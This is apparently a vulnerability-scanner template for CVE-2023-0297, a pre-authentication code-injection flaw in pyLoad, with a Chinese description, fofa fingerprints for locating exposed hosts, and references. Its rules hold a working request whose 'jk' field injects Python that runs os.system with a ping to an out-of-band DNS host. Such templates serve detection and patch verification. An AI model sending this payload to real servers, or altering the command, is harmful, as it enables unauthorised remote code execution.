id: CVE-2023-0297

info:
  name: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
  author: daffainfo
  severity: critical
  verified: true
  description: |-
    pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意Python代码。
    影响版本 pyLoad <= 0.4.20 另外，小于0.5.0b3.dev31版本的pyLoad开发版本也受此漏洞影响。
    fofa: icon_hash="77699822" || icon_hash="-272805727" || icon_hash="2055939329"
  reference:
    - https://mp.weixin.qq.com/s/nwR3b678vrp_7ptGZv-mbg
    - https://mp.weixin.qq.com/s/MwN8XFPPeO__gpsQXHbiMA
    - https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
    - https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/
  tags: cve,cve2023,pyload,rce
  created: 2024/02/26

rules:
  r0:
    request:
      method: GET
      path: /flash/addcrypted2
    expression: response.body.bcontains(b'JDownloader')
  r1:
    request:
      method: POST
      path: /flash/addcrypted2
      body: |
        jk=pyimport+os%3Bos.system%28%22ping%20{{oob.DNS}}%22%29%3Bf%3Dfunction+f2%28%29%7B%7D%3B&packages=YyVIbzmZ&crypted=ZbIlxWYe&passwords=oJFFUtTw
    expression: oobCheck(oob.ProtocolDNS, 5)
expression: r0() && r1()
